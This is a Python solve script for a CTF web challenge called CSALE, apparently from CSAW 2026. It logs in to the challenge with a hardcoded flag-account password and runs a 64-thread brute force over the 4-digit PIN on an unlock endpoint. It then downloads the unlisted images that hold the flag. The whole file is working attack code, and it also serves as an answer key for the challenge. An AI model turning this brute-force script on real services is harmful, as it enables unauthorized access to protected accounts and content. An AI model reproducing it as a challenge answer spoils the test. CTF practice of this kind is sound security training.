#!/usr/bin/env python3
"""
CSALE solver — CSAW 2026 web challenge.

Steps:
  1. Log in as the flag account.
  2. Brute force the 4-digit PIN on /account/unlisted/unlock.
  3. Download the unlisted draft images.
  4. Inspect the saved images; the real flag is in flag_v2.png.

Usage:
  python solve.py http://<target>:5000
"""
import sys
import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
USER = "superdiscreetflaguser"
PASSWORD = "password123"


def find_pin(session_cookie: str) -> str:
    """Exhaust the 10,000-key 4-digit PIN space."""

    def try_pin(n: int):
        r = requests.post(
            f"{BASE}/account/unlisted/unlock",
            data={"pin": f"{n:04d}"},
            cookies={"session": session_cookie},
            timeout=20,
            allow_redirects=False,
        )
        if r.status_code != 403:
            return f"{n:04d}"
        return None

    with ThreadPoolExecutor(max_workers=64) as ex:
        futures = [ex.submit(try_pin, i) for i in range(10000)]
        for f in as_completed(futures):
            pin = f.result()
            if pin:
                return pin
    raise RuntimeError("PIN not found")


def main():
    s = requests.Session()
    print(f"[*] logging in as {USER}")
    s.post(f"{BASE}/login", data={"username": USER, "password": PASSWORD}, timeout=15)
    session_cookie = s.cookies.get("session")

    print("[*] brute forcing 4-digit PIN...")
    pin = find_pin(session_cookie)
    print(f"[+] PIN: {pin}")

    print("[*] unlocking unlisted drafts")
    r = s.post(f"{BASE}/account/unlisted/unlock", data={"pin": pin}, timeout=15, allow_redirects=False)
    print(f"    status: {r.status_code}")

    print("[*] fetching unlisted page and image URLs")
    r = s.get(f"{BASE}/account/unlisted", timeout=20)
    image_paths = sorted(set(re.findall(r'src="(/account/unlisted/\d+/image)"', r.text)))
    print(f"    found {len(image_paths)} image(s): {image_paths}")

    for p in image_paths:
        rr = s.get(BASE + p, timeout=30)
        fn = p.replace("/", "_") + ".png"
        open(fn, "wb").write(rr.content)
        print(f"[+] saved {fn}: {len(rr.content)} bytes")

    print("\n[*] done. inspect the saved PNGs; the real flag is in flag_v2.png.")


if __name__ == "__main__":
    main()
